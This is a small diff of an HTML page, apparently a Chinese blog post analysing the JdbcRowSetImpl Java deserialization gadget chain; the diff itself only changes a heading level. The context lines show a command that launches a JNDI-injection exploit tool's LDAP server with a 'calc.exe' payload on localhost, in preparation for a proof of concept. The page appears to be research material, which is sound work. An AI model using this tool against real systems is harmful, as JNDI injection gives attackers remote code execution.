@@ -175,7 +175,7 @@
 <li>传入参数个数必须为1</li>
 <li>方法开头必须是set</li>
 </ol>
-<h3 id="JdbcRowSetImpl链分析"><a href="#JdbcRowSetImpl链分析" class="headerlink" title="JdbcRowSetImpl链分析"></a>JdbcRowSetImpl链分析</h3><p>使用jndi注入工具启动ldap服务</p>
+<h2 id="JdbcRowSetImpl链分析"><a href="#JdbcRowSetImpl链分析" class="headerlink" title="JdbcRowSetImpl链分析"></a>JdbcRowSetImpl链分析</h2><p>使用jndi注入工具启动ldap服务</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;calc.exe&quot;</span> -A <span class="string">&quot;127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>poc</p>
